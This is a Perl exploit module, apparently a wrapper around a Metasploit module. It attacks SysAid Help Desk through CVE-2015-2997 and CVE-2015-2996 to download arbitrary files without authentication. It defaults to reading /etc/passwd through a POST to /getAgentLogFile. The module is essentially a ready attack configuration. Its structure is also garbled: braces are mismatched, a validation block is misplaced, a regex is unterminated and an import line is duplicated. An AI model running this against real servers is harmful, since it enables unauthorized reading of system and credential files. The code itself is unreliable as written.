package SYSAID::MSF::SysaidFileDownload;
use lib qw(../../); use parent qw(Exploit);

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use URI::URL;
use Data::Dump qw(dump);
use File::Slurp qw(read_file);
use File::Slurp qw(read_file);

# # 
# # 
# # 

sub load {
    my $type  = shift;
    my $class = ref $type || $type;
    my $self = { };
    bless $self, $class;

    return $self;
}

sub new {
   my $class = shift;
   

   my $name = "SysaidFileDownload";

   my $DETECTION = {

   };

my $EXPLOIT = {
  CVE => "CVE-2015-2997",
  DESCRIPTION => "

        This module exploits two vulnerabilities in SysAid Help Desk that allows

        an unauthenticated user to download arbitrary files from the system. First, an

        information disclosure vulnerability (CVE-2015-2997) is used to obtain the file

        system path, and then we abuse a directory traversal (CVE-2015-2996) to download

        the file. Note that there are some limitations on Windows, in that the information

        disclosure vulnerability doesn't work on a Windows platform, and we can only

        traverse the current drive (if you enter C:\\afile.txt and the server is running

        on D:\\ the file will not be downloaded).



        This module has been tested with SysAid 14.4 on Windows and Linux.

        ",
  METHOD => "POST",
  MSF_MODULE => "sysaid_file_download",
  PATH => "accountId=__ACCOUNTID__&computerId=__COMPUTERID__&",
  PATHS => ["etc/passwd"],
  REFERENCES => [
    "http://seclists.org/fulldisclosure/2015/Jun/8",
    "https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt",
  ],
  TITLE => "SysAid Help Desk Arbitrary File Download",
  VARIABLES => {
    'ACCOUNTID' =>       { DESCRIPTION => "", VALUE => "" },
    'COMPUTERID' =>       { DESCRIPTION => "", VALUE => "" },
    'PATH' =>       {
  DESCRIPTION => "Path of the file to download (escape Windows paths with a back slash)",
  VALUE => "/etc/passwd",
},
    'TARGETURI' =>       { DESCRIPTION => "", VALUE => "" },
  },
      },  VALIDATION => {
    'TREGEX' =>       "\\<H2\\>\\(.*\\)\\<\\",

  TYPE => 'MSF',
  PLATFORM => 'ALL',
  REQUESTS => {
    EXPLOIT1 => {
      METHOD       => 'POST',
      PATH   => 'getAgentLogFile',
      PAYLOAD      => read_file('MSFExploits/SYSAID/MSF/src/SysaidFileDownload.payload', 1),
      TEXT   => 'Sending Exploit #1 Request : [POST] /getAgentLogFile',
      HEADERS      => {
        'Content-Type' => 'application/octet-stream',
      },
      VALIDATION   => {
        TCODE => ['200'],
      },
    },
  },
   };

   return $class->SUPER::new($name, $DETECTION, $EXPLOIT, @_);
}

return 1;
